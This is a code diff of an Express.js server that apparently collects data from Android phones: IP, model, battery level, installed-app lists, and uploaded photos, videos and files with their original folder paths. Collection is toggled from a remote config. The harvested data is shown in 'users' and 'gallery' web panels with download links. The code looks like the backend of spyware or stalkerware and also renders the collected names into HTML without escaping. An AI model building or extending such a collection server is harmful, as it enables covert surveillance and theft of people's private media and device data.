@@ -4,9 +4,10 @@ const path = require('path');
 
 const app = express();
 
-/* ================= CONFIG ================= */
+/* ================= CONFIG =================== */
 
 const LOG_FILE = "logs.json";
+const CONFIG_FILE = "config.json";
 
 const UPLOAD_DIR = path.join(__dirname, "uploads");
 const THUMB_DIR = path.join(__dirname, "thumbs");
@@ -18,122 +19,150 @@ if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);
 
 function getIP(req) {
   return (req.headers['x-forwarded-for'] || '').split(',')[0]
-    || req.socket.remoteAddress
-    || "unknown";
+      || req.socket.remoteAddress
+      || "unknown";
 }
 
-function loadLogs() {
+function loadConfig() {
   try {
-    return fs.readFileSync(LOG_FILE, "utf-8")
-      .split("\n")
-      .filter(Boolean)
-      .map(x => JSON.parse(x));
+    return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
   } catch {
-    return [];
+    return { enabled: false };
   }
 }
 
-function saveLog(data) {
-  fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
+function isAllowed(req, type) {
+  const cfg = loadConfig();
+  const ip = getIP(req);
+  const model = req.query.model || "";
+
+  if (!cfg.enabled) return false;
+  if (type === "track" && !cfg.send_device_info) return false;
+  if (type === "upload" && !cfg.send_files) return false;
+  if (cfg.blocked_ips?.includes(ip)) return false;
+  if (cfg.blocked_models?.includes(model)) return false;
+
+  return true;
 }
 
-function isDuplicate(fileName) {
-  const logs = loadLogs();
-  return logs.some(l => l.original === fileName);
+function saveLog(data) {
+  try {
+    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
+  } catch {}
+}
+
+function parseBody(body) {
+  const obj = {};
+  body.split("&").forEach(pair => {
+    const [k, v] = pair.split("=");
+    if (k && v) obj[k] = decodeURIComponent(v);
+  });
+  return obj;
 }
 
 /* ================= CONFIG ================= */
 
-/* ================= CONFIG SYSTEM ================= */
-
 app.get('/config', (req, res) => {
-
   const cfg = loadConfig();
-
-  if (!cfg.enabled) {
-    return res.send("0|0");
-  }
-
-  const sendFiles = cfg.send_files ? "1" : "0";
-  const sendDevice = cfg.send_device_info ? "1" : "0";
-
-  res.send(`${sendFiles}|${sendDevice}`);
+  res.send(cfg.enabled ? "1" : "0");
 });
-
 
 /* ================= TRACK ================= */
 
-app.get('/track', (req, res) => {
+app.post('/track', (req, res) => {
 
-  const apps = req.query.apps
-    ? req.query.apps.split(",").map(x => x.trim()).filter(Boolean)
-    : [];
+  if (!isAllowed(req, "track")) {
+    return res.json({ status: "blocked" });
+  }
 
-  const systemApps = apps.filter(a =>
-    a.startsWith("android") ||
-    a.startsWith("com.android") ||
-    a.startsWith("com.google")
-  );
+  let body = "";
 
-  const userApps = apps.filter(a => !systemApps.includes(a));
+  req.on('data', chunk => body += chunk.toString());
 
-  const deviceId = getIP(req) + "_" + (req.query.model || "unknown");
+  req.on('end', () => {
 
-  const data = {
-    type: "device",
-    device_id: deviceId,
-    ip: getIP(req),
-    battery: req.query.battery,
-    model: req.query.model,
-    brand: req.query.brand,
-    android: req.query.android,
-    app_count: apps.length,
-    system_apps: systemApps,
-    user_apps: userApps,
-    time: new Date().toISOString()
-  };
+    const parsed = parseBody(body);
 
-  console.log("📱 DEVICE:", data.model);
+    const allApps = parsed.apps
+      ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
+      : [];
 
-  saveLog(data);
+    const systemApps = allApps.filter(a =>
+      a.startsWith("android") ||
+      a.startsWith("com.android") ||
+      a.startsWith("com.google")
+    );
 
-  res.json({ status: "ok" });
+    const userApps = allApps.filter(a => !systemApps.includes(a));
+
+    const data = {
+      type: "device",
+      ip: getIP(req),
+      battery: parsed.battery,
+      model: parsed.model,
+      brand: parsed.brand,
+      android: parsed.android,
+      app_count: allApps.length,
+      system_apps: systemApps,
+      user_apps: userApps,
+      time: new Date().toISOString()
+    };
+
+    console.log("\n📱 DEVICE =====================");
+    console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
+    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count}`);
+    console.log("======================================");
+
+    saveLog(data);
+
+    res.json({ status: "ok" });
+  });
 });
 
 /* ================= UPLOAD ================= */
 
 app.post('/upload', (req, res) => {
 
+  if (!isAllowed(req, "upload")) {
+    return res.status(403).send("blocked");
+  }
+
   let fileName = "file.bin";
+  let folder = "unknown";
 
   if (req.query.name) {
     try {
-      fileName = path.basename(decodeURIComponent(req.query.name));
+      const decoded = decodeURIComponent(req.query.name);
+      folder = path.dirname(decoded);
+      fileName = path.basename(decoded);
     } catch {}
-  }
-
-  if (isDuplicate(fileName)) {
-    return res.json({ status: "duplicate_skipped" });
   }
 
   const safeName = Date.now() + "_" + fileName;
   const filePath = path.join(UPLOAD_DIR, safeName);
-  const thumbPath = path.join(THUMB_DIR, "thumb_" + safeName);
 
-  const deviceId = getIP(req);
+  const thumbName = "thumb_" + safeName;
+  const thumbPath = path.join(THUMB_DIR, thumbName);
+
+  console.log("\n📦 FILE RECEIVED =====================");
+  console.log(`Path: ${folder}`);
+  console.log(`File: ${fileName}`);
+  console.log("======================================");
 
   const stream = fs.createWriteStream(filePath);
   req.pipe(stream);
 
   req.on('end', () => {
 
+    // simple thumbnail (copy)
     fs.copyFile(filePath, thumbPath, () => {});
 
     saveLog({
       type: "file",
-      device_id: deviceId,
       file: safeName,
       original: fileName,
+      folder: folder,
+      thumb: thumbName,
       time: new Date().toISOString()
     });
 
@@ -149,63 +178,112 @@ app.post('/upload', (req, res) => {
 
 app.get('/users', (req, res) => {
 
-  const logs = loadLogs();
+  if (!fs.existsSync(LOG_FILE)) return res.send("No data");
+
+  const logs = fs.readFileSync(LOG_FILE, "utf-8")
+    .split("\n")
+    .filter(Boolean)
+    .map(x => {
+      try { return JSON.parse(x); }
+      catch { return null; }
+    })
+    .filter(Boolean);
 
   const devices = logs.filter(x => x.type === "device");
+
+  const unique = {};
+  devices.forEach(d => {
+    if (!d.ip || !d.model) return;
+    unique[d.ip + "_" + d.model] = d;
+  });
+
+  const list = Object.values(unique);
+
+  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
+
+  list.reverse().forEach(u => {
+
+    const apps = u.user_apps || u.apps || [];
+    const system = u.system_apps || [];
+
+    html += `
+    <div style="border:1px solid #333;padding:10px;margin:10px">
+      <b>${u.brand || ""} ${u.model || ""}</b><br>
+      IP: ${u.ip || ""}<br>
+      Battery: ${u.battery || ""}<br>
+      Apps: ${u.app_count || apps.length}<br>
+
+      <h4>Apps</h4>
+      ${apps.map(a => `<div>${a}</div>`).join("")}
+
+      ${system.length ? `<h4>System Apps</h4>
+      ${system.map(a => `<div>${a}</div>`).join("")}` : ""}
+    </div>
+    `;
+  });
+
+  html += "</body></html>";
+  res.send(html);
+});
+
+/* ================= GALLERY ================= */
+
+app.get('/gallery', (req, res) => {
+
+  if (!fs.existsSync(LOG_FILE)) return res.send("No data");
+
+  const logs = fs.readFileSync(LOG_FILE, "utf-8")
+    .split("\n")
+    .filter(Boolean)
+    .map(x => JSON.parse(x));
+
   const files = logs.filter(x => x.type === "file");
 
   const grouped = {};
 
-  devices.forEach(d => {
-    const id = d.device_id;
-    if (!grouped[id]) grouped[id] = { info: d, files: [] };
-  });
-
   files.forEach(f => {
-    const id = f.device_id;
-    if (grouped[id]) {
-      grouped[id].files.push(f);
-    }
+    const key = f.folder || "unknown";
+    if (!grouped[key]) grouped[key] = [];
+    grouped[key].push(f);
   });
 
-  let html = `
-  <html>
-  <head>
-    <meta http-equiv="refresh" content="5">
-    <style>
-      body { background:#111;color:#fff;font-family:sans-serif }
-      .box { border:2px solid #444;margin:15px;padding:15px }
-      img, video { width:150px;margin:5px;border-radius:10px }
-    </style>
-  </head>
-  <body>
-  <h1>🔥 Live Devices</h1>
-  `;
+  let html = `<html>
+  <body style="background:#111;color:#fff;font-family:sans-serif">
+  <h2>📁 Smart Gallery</h2>`;
 
-  Object.values(grouped).reverse().forEach(g => {
+  Object.keys(grouped).forEach(folder => {
 
-    const u = g.info;
+    html += `<h3>📂 ${folder}</h3><div style="display:flex;flex-wrap:wrap">`;
 
-    html += `
-    <div class="box">
-      <h2>📱 ${u.brand || ""} ${u.model || ""}</h2>
-      IP: ${u.ip}<br>
-      Battery: ${u.battery}%<br>
-      Apps: ${u.app_count}<br>
+    grouped[folder].reverse().forEach(f => {
 
-      <h3>📂 Files (${g.files.length})</h3>
-    `;
-
-    g.files.slice(-10).reverse().forEach(f => {
-
-      const url = "/uploads/" + f.file;
+      const full = `/uploads/${f.file}`;
+      const thumb = `/thumbs/${f.thumb}`;
 
       if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
-        html += `<img src="${url}">`;
-      } else if (f.file.endsWith(".mp4")) {
-        html += `<video controls src="${url}"></video>`;
-      } else {
-        html += `<div>📄 ${f.original}</div>`;
+        html += `
+        <div style="margin:10px">
+          <img src="${thumb}" width="200"
+            onclick="this.src='${full}'" style="cursor:pointer"><br>
+          <a href="${full}" download>⬇ Download</a>
+        </div>
+        `;
+      }
+
+      else if (f.file.endsWith(".mp4")) {
+        html += `
+        <div style="margin:10px">
+          <video width="200" preload="metadata"
+            onclick="this.src='${full}'; this.play()">
+            <source src="${thumb}">
+          </video><br>
+          <a href="${full}" download>⬇ Download</a>
+        </div>
+        `;
+      }
+
+      else {
+        html += `<a href="${full}">${f.original}</a>`;
       }
 
     });
